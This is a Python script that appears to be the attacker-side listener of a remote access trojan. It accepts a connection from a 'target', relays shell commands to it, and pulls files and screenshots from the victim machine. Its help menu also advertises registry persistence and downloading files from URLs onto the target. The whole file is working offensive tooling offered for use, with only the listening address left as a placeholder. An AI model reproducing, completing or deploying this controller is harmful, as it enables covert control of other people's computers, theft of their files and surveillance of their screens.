#!/usr/bin/python3

import socket
from termcolor import colored
import subprocess
import json
import base64
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def commands():
    count = 0
    while True:
        command = input(colored('|\/|~%s > ' % str(ip), 'green'))
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            continue
        elif command == 'clear':
            os.system('clear')
        elif command == 'help':
            print(colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            persistence *RegName* *fileName*    --> Create Persistence In Registry
            screenshot                          --> Takes Screenshot of Victim Machine
            get *URL*                           --> Downloads File From Specified URL'''),'green')
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        else:
            result = reliable_recv()
            print(result)

def connection():
    global server
    global ip 
    global target
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('<your ip>', <your ip>))
    server.listen(5)
    print(colored('|\/| Listening For Incoming Connection ', 'green'))
    target, ip = server.accept()
    print(colored('|\/| Connection Established From: %s' % str(ip), 'green'))

connection()
commands()
server.close()
